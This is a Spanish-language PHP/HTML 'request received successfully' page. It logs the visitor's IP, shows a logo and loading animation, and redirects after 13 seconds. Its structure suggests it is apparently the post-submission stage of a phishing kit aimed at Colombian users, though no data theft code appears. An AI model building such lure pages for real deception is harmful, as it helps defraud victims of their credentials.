<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");

date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title>Tu solicitud fue recibida con EXITO!</title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">
		<meta content="es" http-equiv="Content-Language">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">	 	
		<link href="../../../../../src/css/layout.css" rel="stylesheet">
		<link href="../../../../../src/css/fonts.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="../../../../../src/img/logo.png" />
		<script type="text/javascript" src="../../../../../src/js/jquery-3.6.0.min.js"></script>
		<script src="../../../../../src/js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../../../../src/js/run.js"></script>  	
   	</head>
   	<body style="">
			
	<div style="text-align:center;  margin-top: 13%;"> 		
			<img src="../../../../../src/img/logo.svg">
			
			<br><br><p class="text-center" style="font-family: 'OpenSans-Regular' !important; width:90%; max-width: 457px; display: inline-block; font-size: 18px;">
</p><br><br><p class="text-center" style="font-family: 'OpenSans-Regular' !important; width:90%; max-width: 457px; display: inline-block; font-size: 14px;">
</p><br>
           
<style>
        /* Estilos generales */
        .imagen {
            width: 100%;
            height: auto;
        }

        /* Estilos para dispositivos móviles */
        @media only screen and (max-width: 600px) {
            .imagen {
                width: 80%;
                height: auto;
            }

			</style>
</head>
<body>
    <img class="imagen" src="../../../../../src/img/load3.gif" alt="Imagen GIF ajustable">

</body>
			
			</div>					
		  
     
			
<meta http-equiv="PRAGMA" content="NO-CACHE"> 
<meta http-equiv="Expires" content="-1">
	</body>
</html>
<script language="javascript">

	let identificadorTiempoDeEspera;

	function temporizadorDeRetraso() {
	  identificadorTiempoDeEspera = setTimeout(funcionConRetraso, 13000);
	}

	function funcionConRetraso() {
		window.location.href = "" 
	}

	$(document).ready(function() {

	temporizadorDeRetraso();
});

</script>